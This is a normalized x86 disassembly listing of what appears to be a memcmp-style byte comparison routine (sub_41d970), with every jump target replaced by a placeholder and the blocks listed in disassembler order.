movzx eax [ edx + 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
add ecx 0x20
add edx 0x20
sub edi 0x20
movzx esi [ ecx + 0x1d ]
movzx eax [ edx + 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1b ]
movzx eax [ edx + 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1e ]
movzx eax [ edx + 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
movzx esi [ ecx + 0x1f ]
movzx eax [ edx + 0x1f ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
sub_41d970
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_41ee44 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
